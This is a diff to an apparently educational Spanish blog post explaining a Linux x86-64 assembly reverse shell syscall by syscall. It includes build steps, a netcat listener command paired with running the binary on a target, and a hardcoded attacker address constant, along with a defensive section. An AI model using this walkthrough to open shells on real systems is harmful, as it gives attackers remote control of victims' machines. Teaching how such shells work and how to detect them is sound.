@@ -5,11 +5,34 @@ date: 2025-10-16 11:00:00 +0200
 tags: [post, reverse-shell, hacking, linux, asm]
 ---
 
+---
+layout: post
+title: "Reverse Shell TCP en Assembly x86-64 (Linux)"
+date: 2025-10-16 10:00:00 +0200
+categories: [assembly, security, low-level]
+---
+
 ## Introducción
 
 Una **reverse shell** es una técnica donde la máquina comprometida inicia una conexión saliente hacia el atacante, quien queda a la escucha. A diferencia de una bind shell (donde el objetivo escucha), la reverse shell sortea firewalls que bloquean conexiones entrantes pero permiten salientes.
 
 En este post vamos a diseccionar una implementación minimalista en **assembly x86-64** para Linux, usando únicamente syscalls del kernel. El objetivo es educativo: entender cómo funciona a bajo nivel, qué syscalls intervienen y cómo se ensamblan para crear un canal de comunicación completo.
+
+---
+
+## Arquitectura de la Reverse Shell
+
+El flujo es simple pero efectivo:
+
+1. **SOCKET**: Crear un socket TCP/IPv4
+2. **CONNECT**: Conectar al IP:puerto del atacante
+3. **DUP2**: Redirigir stdin, stdout y stderr al socket
+4. **EXECVE**: Ejecutar `/bin/sh` (shell interactiva)
+
+Una vez completados estos pasos, el atacante tiene control total sobre la shell del sistema comprometido.
+
+---
+
 ## Código Completo
 
 ```nasm
@@ -109,6 +132,28 @@ _start:
     xor rdi, rdi       ; exit code = 0
     syscall
 ```
+
+---
+
+## Desglose por Syscalls
+
+### 1. SOCKET (RAX 41)
+
+Crea un **objeto de comunicación** y devuelve un file descriptor (FD). En este caso, un socket TCP/IPv4.
+
+**Argumentos:**
+- `rdi = 2` → `AF_INET` (familia IPv4)
+- `rsi = 1` → `SOCK_STREAM` (TCP, orientado a conexión)
+- `rdx = 0` → Protocolo por defecto (TCP para `SOCK_STREAM`)
+
+**Retorno:**
+- `rax ≥ 0` → FD del socket creado
+- `rax < 0` → Error (EAFNOSUPPORT, EMFILE, etc.)
+
+El socket recién creado es solo una estructura en memoria del kernel. No tiene IP ni puerto asignados hasta que se haga `bind()` (para servidores) o `connect()` (para clientes).
+
+---
+
 ### 2. CONNECT (RAX 42)
 
 Inicia el **handshake TCP** (SYN → SYN/ACK → ACK) con el servidor remoto especificado en la estructura `sockaddr_in`.
@@ -132,6 +177,25 @@ Inicia el **handshake TCP** (SYN → SYN/ACK → ACK) con el servidor remoto esp
 **Retorno:**
 - `rax = 0` → Conexión establecida
 - `rax < 0` → Error (ECONNREFUSED, ETIMEDOUT, ENETUNREACH, etc.)
+
+---
+
+### 3. DUP2 (RAX 33)
+
+Duplica un file descriptor sobre otro, cerrando primero el destino si estaba abierto. Ambos FDs quedan apuntando a la misma **open file description** (mismo offset y flags).
+
+**Argumentos:**
+- `rdi = r8` → `oldfd` (socket FD)
+- `rsi = 0, 1, 2` → `newfd` (stdin, stdout, stderr)
+
+**Efecto:** Después del loop, cualquier lectura de stdin o escritura a stdout/stderr del proceso se redirige al socket TCP. Cuando se ejecute la shell, su entrada/salida viajará por la red.
+
+**Retorno:**
+- `rax = newfd` → Éxito
+- `rax < 0` → Error (EBADF, EMFILE)
+
+---
+
 ### 4. EXECVE (RAX 59)
 
 Reemplaza la imagen del proceso actual por `/bin/sh`. El PID no cambia, pero el código, heap y stack se descartan completamente.
@@ -149,6 +213,34 @@ Reemplaza la imagen del proceso actual por `/bin/sh`. El PID no cambia, pero el 
 **Retorno:**
 - No hay retorno si tiene éxito (el proceso "es" ahora `/bin/sh`)
 - `rax < 0` → Error (ENOENT, EACCES, ENOEXEC, etc.)
+
+---
+
+## Compilación y Uso
+
+### Compilar el shellcode:
+
+```bash
+nasm -f elf64 reverse_tcp_x86-64.asm -o reverse_tcp.o
+ld reverse_tcp.o -o reverse_tcp
+```
+
+### En la máquina atacante:
+
+```bash
+nc -lvnp 4444
+```
+
+### En la máquina objetivo:
+
+```bash
+./reverse_tcp
+```
+
+Si todo funciona correctamente, obtendrás una shell interactiva en el listener de netcat.
+
+---
+
 ## Modificaciones y Personalización
 
 Para adaptar esta reverse shell a tu entorno:
@@ -164,6 +256,22 @@ Para adaptar esta reverse shell a tu entorno:
 ```nasm
 mov r10, 0x0100000a1f900002
 ```
+
+---
+
+## Consideraciones de Seguridad
+
+⚠️ **Disclaimer:** Este código es **exclusivamente educativo**. Su uso malicioso es **ilegal** y puede acarrear consecuencias penales graves.
+
+**Defensa contra reverse shells:**
+- Firewalls de salida (egress filtering)
+- Monitoreo de conexiones salientes inusuales
+- IDS/IPS con reglas para detectar patrones de shells
+- SELinux/AppArmor para restringir `execve()` y `connect()`
+- Análisis de procesos que llaman syscalls sospechosas
+
+---
+
 ## Conclusión
 
 Esta reverse shell demuestra la potencia de las syscalls directas: en menos de 60 líneas de assembly, hemos construido un canal bidireccional completamente funcional. Entender estos fundamentos es crucial tanto para desarrollar exploits como para defenderse de ellos.
